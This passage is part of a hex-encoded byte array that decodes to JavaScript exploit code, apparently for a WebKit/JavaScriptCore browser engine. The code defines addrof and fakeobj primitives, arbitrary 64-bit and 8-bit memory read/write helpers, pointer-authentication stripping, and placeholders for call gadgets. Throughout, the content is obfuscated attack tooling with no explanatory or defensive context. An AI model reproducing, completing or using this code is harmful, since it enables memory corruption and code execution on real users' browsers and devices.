0x20, 0x6c, 0x65, 0x74, 0x20, 0x73, 0x20, 0x3d, 0x20, 0x74, 0x68, 0x69, 0x73, 0x2e, 0x74, 0x6f, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x28, 0x31, 0x36, 0x29, 0x2e, 0x70, 0x61, 0x64, 0x53, 0x74, 0x61, 0x72, 0x74, 0x28, 0x70, 0x61, 0x64, 0x4e, 0x75, 0x6d, 0x62, 0x65, 0x72, 0x2c, 0x20, 0x70, 0x61, 0x64, 0x43, 0x68, 0x61, 0x72, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x5b, 0x5d, 0x5b, 0x73, 0x5d, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x73, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x42, 0x69, 0x67, 0x49, 0x6e, 0x74, 0x2e, 0x70, 0x72, 0x6f, 0x74, 0x6f, 0x74, 0x79, 0x70, 0x65, 0x2e, 0x61, 0x73, 0x44, 0x6f, 0x75, 0x62, 0x6c, 0x65, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x75, 0x36, 0x34, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x74, 0x68, 0x69, 0x73, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x66, 0x36, 0x34, 0x5b, 0x30, 0x5d, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x42, 0x69, 0x67, 0x49, 0x6e, 0x74, 0x2e, 0x70, 0x72, 0x6f, 0x74, 0x6f, 0x74, 0x79, 0x70, 0x65, 0x2e, 0x6e, 0x6f, 0x50, 0x41, 0x43, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x6f, 0x74, 0x68, 0x65, 0x72, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x26, 0x20, 0x30, 0x78, 0x37, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x42, 0x69, 0x67, 0x49, 0x6e, 0x74, 0x2e, 0x70, 0x72, 0x6f, 0x74, 0x6f, 0x74, 0x79, 0x70, 0x65, 0x2e, 0x61, 0x73, 0x49, 0x6e, 0x74, 0x33, 0x32, 0x73, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x75, 0x36, 0x34, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x74, 0x68, 0x69, 0x73, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x73, 0x74, 0x20, 0x6c, 0x6f, 0x20, 0x3d, 0x20, 0x75, 0x33, 0x32, 0x5b, 0x30, 0x5d, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x73, 0x74, 0x20, 0x68, 0x69, 0x20, 0x3d, 0x20, 0x75, 0x33, 0x32, 0x5b, 0x31, 0x5d, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x6c, 0x65, 0x74, 0x20, 0x6e, 0x65, 0x77, 0x5f, 0x68, 0x69, 0x20, 0x3d, 0x20, 0x68, 0x69, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x69, 0x66, 0x20, 0x28, 0x68, 0x69, 0x20, 0x3e, 0x3d, 0x20, 0x30, 0x78, 0x38, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x6e, 0x65, 0x77, 0x5f, 0x68, 0x69, 0x20, 0x3d, 0x20, 0x68, 0x69, 0x20, 0x2d, 0x20, 0x30, 0x78, 0x31, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x20, 0x26, 0x20, 0x30, 0x78, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x7d, 0xa, 0x20, 0x20, 0x20, 0x20, 0x6c, 0x65, 0x74, 0x20, 0x6e, 0x65, 0x77, 0x5f, 0x6c, 0x6f, 0x20, 0x3d, 0x20, 0x6c, 0x6f, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x69, 0x66, 0x20, 0x28, 0x6c, 0x6f, 0x20, 0x3e, 0x3d, 0x20, 0x30, 0x78, 0x38, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x6e, 0x65, 0x77, 0x5f, 0x6c, 0x6f, 0x20, 0x3d, 0x20, 0x6c, 0x6f, 0x20, 0x2d, 0x20, 0x30, 0x78, 0x31, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x20, 0x26, 0x20, 0x30, 0x78, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x7d, 0xa, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x5b, 0x6e, 0x65, 0x77, 0x5f, 0x6c, 0x6f, 0x2c, 0x20, 0x6e, 0x65, 0x77, 0x5f, 0x68, 0x69, 0x5d, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x73, 0x74, 0x20, 0x6e, 0x6f, 0x43, 0x6f, 0x77, 0x20, 0x3d, 0x20, 0x31, 0x2e, 0x31, 0x3b, 0xa, 0x20, 0x20, 0x75, 0x6e, 0x62, 0x6f, 0x78, 0x65, 0x64, 0x5f, 0x61, 0x72, 0x72, 0x20, 0x3d, 0x20, 0x5b, 0x6e, 0x6f, 0x43, 0x6f, 0x77, 0x5d, 0x3b, 0xa, 0x20, 0x20, 0x62, 0x6f, 0x78, 0x65, 0x64, 0x5f, 0x61, 0x72, 0x72, 0x20, 0x3d, 0x20, 0x5b, 0x7b, 0x7d, 0x5d, 0x3b, 0xa, 0x20, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x20, 0x3d, 0x20, 0x6e, 0x65, 0x77, 0x20, 0x55, 0x69, 0x6e, 0x74, 0x38, 0x41, 0x72, 0x72, 0x61, 0x79, 0x28, 0x30, 0x78, 0x34, 0x30, 0x30, 0x30, 0x29, 0x2e, 0x66, 0x69, 0x6c, 0x6c, 0x28, 0x30, 0x78, 0x66, 0x65, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x20, 0x3d, 0x20, 0x6e, 0x65, 0x77, 0x20, 0x42, 0x69, 0x67, 0x55, 0x69, 0x6e, 0x74, 0x36, 0x34, 0x41, 0x72, 0x72, 0x61, 0x79, 0x28, 0x30, 0x78, 0x31, 0x30, 0x30, 0x30, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x72, 0x77, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x20, 0x3d, 0x20, 0x6e, 0x65, 0x77, 0x20, 0x42, 0x69, 0x67, 0x55, 0x69, 0x6e, 0x74, 0x36, 0x34, 0x41, 0x72, 0x72, 0x61, 0x79, 0x28, 0x30, 0x78, 0x31, 0x30, 0x30, 0x30, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5f, 0x38, 0x20, 0x3d, 0x20, 0x6e, 0x65, 0x77, 0x20, 0x42, 0x69, 0x67, 0x55, 0x69, 0x6e, 0x74, 0x36, 0x34, 0x41, 0x72, 0x72, 0x61, 0x79, 0x28, 0x30, 0x78, 0x31, 0x30, 0x30, 0x30, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x72, 0x77, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5f, 0x38, 0x20, 0x3d, 0x20, 0x6e, 0x65, 0x77, 0x20, 0x55, 0x69, 0x6e, 0x74, 0x38, 0x41, 0x72, 0x72, 0x61, 0x79, 0x28, 0x30, 0x78, 0x31, 0x30, 0x30, 0x30, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x73, 0x74, 0x20, 0x6d, 0x65, 0x6d, 0x20, 0x3d, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x61, 0x64, 0x64, 0x72, 0x6f, 0x66, 0x3a, 0x20, 0x75, 0x6e, 0x64, 0x65, 0x66, 0x69, 0x6e, 0x65, 0x64, 0x2c, 0xa, 0x20, 0x20, 0x20, 0x20, 0x66, 0x61, 0x6b, 0x65, 0x6f, 0x62, 0x6a, 0x3a, 0x20, 0x75, 0x6e, 0x64, 0x65, 0x66, 0x69, 0x6e, 0x65, 0x64, 0x2c, 0xa, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x3a, 0x20, 0x75, 0x6e, 0x64, 0x65, 0x66, 0x69, 0x6e, 0x65, 0x64, 0x2c, 0xa, 0x20, 0x20, 0x20, 0x20, 0x77, 0x72, 0x69, 0x74, 0x65, 0x36, 0x34, 0x3a, 0x20, 0x75, 0x6e, 0x64, 0x65, 0x66, 0x69, 0x6e, 0x65, 0x64, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x61, 0x64, 0x64, 0x72, 0x6f, 0x66, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x6f, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x62, 0x6f, 0x78, 0x65, 0x64, 0x5f, 0x61, 0x72, 0x72, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x6f, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x42, 0x69, 0x67, 0x49, 0x6e, 0x74, 0x2e, 0x66, 0x72, 0x6f, 0x6d, 0x44, 0x6f, 0x75, 0x62, 0x6c, 0x65, 0x28, 0x75, 0x6e, 0x62, 0x6f, 0x78, 0x65, 0x64, 0x5f, 0x61, 0x72, 0x72, 0x5b, 0x30, 0x5d, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x66, 0x61, 0x6b, 0x65, 0x6f, 0x62, 0x6a, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x61, 0x64, 0x64, 0x72, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x75, 0x6e, 0x62, 0x6f, 0x78, 0x65, 0x64, 0x5f, 0x61, 0x72, 0x72, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x61, 0x64, 0x64, 0x72, 0x2e, 0x61, 0x73, 0x44, 0x6f, 0x75, 0x62, 0x6c, 0x65, 0x28, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x62, 0x6f, 0x78, 0x65, 0x64, 0x5f, 0x61, 0x72, 0x72, 0x5b, 0x30, 0x5d, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x77, 0x68, 0x65, 0x72, 0x65, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x77, 0x68, 0x65, 0x72, 0x65, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x6c, 0x65, 0x74, 0x20, 0x72, 0x73, 0x20, 0x3d, 0x20, 0x72, 0x77, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5b, 0x30, 0x5d, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x72, 0x73, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x63, 0x6d, 0x70, 0x36, 0x34, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x77, 0x68, 0x65, 0x72, 0x65, 0x2c, 0x20, 0x76, 0x61, 0x6c, 0x75, 0x65, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x77, 0x68, 0x65, 0x72, 0x65, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x6c, 0x65, 0x74, 0x20, 0x72, 0x73, 0x20, 0x3d, 0x20, 0x72, 0x77, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x3d, 0x20, 0x76, 0x61, 0x6c, 0x75, 0x65, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x72, 0x73, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x77, 0x72, 0x69, 0x74, 0x65, 0x36, 0x34, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x77, 0x68, 0x65, 0x72, 0x65, 0x2c, 0x20, 0x77, 0x68, 0x61, 0x74, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x77, 0x68, 0x65, 0x72, 0x65, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x72, 0x77, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x77, 0x68, 0x61, 0x74, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x38, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x77, 0x68, 0x65, 0x72, 0x65, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5f, 0x38, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x77, 0x68, 0x65, 0x72, 0x65, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x6c, 0x65, 0x74, 0x20, 0x72, 0x73, 0x20, 0x3d, 0x20, 0x72, 0x77, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5f, 0x38, 0x5b, 0x30, 0x5d, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5f, 0x38, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x72, 0x73, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x75, 0x77, 0x72, 0x69, 0x74, 0x65, 0x38, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x77, 0x68, 0x65, 0x72, 0x65, 0x2c, 0x20, 0x77, 0x68, 0x61, 0x74, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5f, 0x38, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x77, 0x68, 0x65, 0x72, 0x65, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x72, 0x77, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5f, 0x38, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x77, 0x68, 0x61, 0x74, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5f, 0x38, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x63, 0x6d, 0x70, 0x38, 0x5f, 0x77, 0x61, 0x69, 0x74, 0x5f, 0x66, 0x6f, 0x72, 0x5f, 0x63, 0x68, 0x61, 0x6e, 0x67, 0x65, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x77, 0x68, 0x65, 0x72, 0x65, 0x2c, 0x20, 0x76, 0x61, 0x6c, 0x75, 0x65, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5f, 0x38, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x77, 0x68, 0x65, 0x72, 0x65, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x77, 0x68, 0x69, 0x6c, 0x65, 0x20, 0x28, 0x72, 0x77, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5f, 0x38, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x3d, 0x20, 0x76, 0x61, 0x6c, 0x75, 0x65, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5f, 0x38, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x6d, 0x65, 0x6d, 0x2e, 0x61, 0x64, 0x64, 0x72, 0x6f, 0x66, 0x20, 0x3d, 0x20, 0x61, 0x64, 0x64, 0x72, 0x6f, 0x66, 0x3b, 0xa, 0x20, 0x20, 0x6d, 0x65, 0x6d, 0x2e, 0x66, 0x61, 0x6b, 0x65, 0x6f, 0x62, 0x6a, 0x20, 0x3d, 0x20, 0x66, 0x61, 0x6b, 0x65, 0x6f, 0x62, 0x6a, 0x3b, 0xa, 0x20, 0x20, 0x6d, 0x65, 0x6d, 0x2e, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x20, 0x3d, 0x20, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x3b, 0xa, 0x20, 0x20, 0x6d, 0x65, 0x6d, 0x2e, 0x77, 0x72, 0x69, 0x74, 0x65, 0x36, 0x34, 0x20, 0x3d, 0x20, 0x77, 0x72, 0x69, 0x74, 0x65, 0x36, 0x34, 0x3b, 0xa, 0x20, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x20, 0x3d, 0x20, 0x6d, 0x65, 0x6d, 0x2e, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x3b, 0xa, 0x20, 0x20, 0x75, 0x77, 0x72, 0x69, 0x74, 0x65, 0x36, 0x34, 0x20, 0x3d, 0x20, 0x6d, 0x65, 0x6d, 0x2e, 0x77, 0x72, 0x69, 0x74, 0x65, 0x36, 0x34, 0x3b, 0xa, 0x20, 0x20, 0x67, 0x65, 0x74, 0x5f, 0x63, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x6a, 0x73, 0x5f, 0x73, 0x74, 0x72, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x6c, 0x65, 0x74, 0x20, 0x73, 0x20, 0x3d, 0x20, 0x6a, 0x73, 0x5f, 0x73, 0x74, 0x72, 0x20, 0x2b, 0x20, 0x22, 0x5c, 0x78, 0x30, 0x30, 0x22, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x5b, 0x5d, 0x5b, 0x73, 0x5d, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x61, 0x64, 0x64, 0x72, 0x6f, 0x66, 0x28, 0x73, 0x29, 0x20, 0x2b, 0x20, 0x30, 0x78, 0x38, 0x6e, 0x29, 0x20, 0x2b, 0x20, 0x30, 0x78, 0x38, 0x6e, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x6e, 0x65, 0x77, 0x5f, 0x62, 0x69, 0x67, 0x69, 0x6e, 0x74, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x42, 0x69, 0x67, 0x49, 0x6e, 0x74, 0x28, 0x22, 0x30, 0x78, 0x33, 0x33, 0x33, 0x33, 0x22, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x75, 0x70, 0x64, 0x61, 0x74, 0x65, 0x5f, 0x62, 0x69, 0x67, 0x69, 0x6e, 0x74, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x62, 0x69, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x62, 0x69, 0x20, 0x2b, 0x20, 0x30, 0x78, 0x31, 0x6e, 0x20, 0x2d, 0x20, 0x30, 0x78, 0x31, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x67, 0x65, 0x74, 0x5f, 0x62, 0x69, 0x67, 0x69, 0x6e, 0x74, 0x5f, 0x61, 0x64, 0x64, 0x72, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x62, 0x69, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x61, 0x64, 0x64, 0x72, 0x6f, 0x66, 0x28, 0x62, 0x69, 0x29, 0x20, 0x2b, 0x20, 0x30, 0x78, 0x31, 0x38, 0x6e, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x20, 0x3d, 0x20, 0x75, 0x6e, 0x64, 0x65, 0x66, 0x69, 0x6e, 0x65, 0x64, 0x3b, 0xa, 0x20, 0x20, 0x67, 0x70, 0x75, 0x5f, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x20, 0x3d, 0x20, 0x75, 0x6e, 0x64, 0x65, 0x66, 0x69, 0x6e, 0x65, 0x64, 0x3b, 0xa, 0x20, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x72, 0x65, 0x73, 0x6f, 0x6c, 0x76, 0x65, 0x20, 0x3d, 0x20, 0x75, 0x6e, 0x64, 0x65, 0x66, 0x69, 0x6e, 0x65, 0x64, 0x3b, 0xa, 0x20, 0x20, 0x70, 0x61, 0x63, 0x69, 0x61, 0x20, 0x3d, 0x20, 0x75, 0x6e, 0x64, 0x65, 0x66, 0x69, 0x6e, 0x65, 0x64, 0x3b, 0xa, 0x20, 0x20, 0x70, 0x61, 0x63, 0x69, 0x62, 0x20, 0x3d, 0x20, 0x75, 0x6e, 0x64, 0x65, 0x66, 0x69, 0x6e, 0x65, 0x64, 0x3b, 0xa, 0x20, 0x20, 0x4c, 0x4f, 0x47, 0x20, 0x3d, 0x20, 0x75, 0x6e, 0x64, 0x65, 0x66, 0x69, 0x6e, 0x65, 0x64, 0x3b, 0xa, 0x20, 0x20, 0x69, 0x6e, 0x74, 0x65, 0x67, 0x72, 0x61, 0x74, 0x65, 0x64, 0x20, 0x3d, 0x20, 0x66, 0x61, 0x6c, 0x73, 0x65, 0x3b, 0xa, 0x20, 0x20, 0x75, 0x73, 0x65, 0x5f, 0x6a, 0x73, 0x5f, 0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x20, 0x3d, 0x20, 0x66, 0x61, 0x6c, 0x73, 0x65, 0x3b, 0xa, 0x20, 0x20, 0x5f, 0x43, 0x46, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x43, 0x6f, 0x70, 0x79, 0x50, 0x72, 0x6f, 0x70, 0x65, 0x72, 0x74, 0x79, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x6c, 0x6f, 0x61, 0x64, 0x5f, 0x78, 0x31, 0x78, 0x33, 0x78, 0x38, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x31, 0x34, 0x5f, 0x61, 0x72, 0x67, 0x73, 0x5f, 0x77, 0x72, 0x69, 0x74, 0x65, 0x5f, 0x78, 0x38, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x6a, 0x73, 0x76, 0x6d, 0x5f, 0x69, 0x73, 0x4e, 0x41, 0x4e, 0x5f, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x67, 0x61, 0x64, 0x67, 0x65, 0x74, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0xa, 0x20, 0x20, 0x6a, 0x73, 0x76, 0x6d, 0x5f, 0x69, 0x73, 0x4e, 0x41, 0x4e, 0x5f, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x67, 0x61, 0x64, 0x67, 0x65, 0x74, 0x32, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0xa, 0x20, 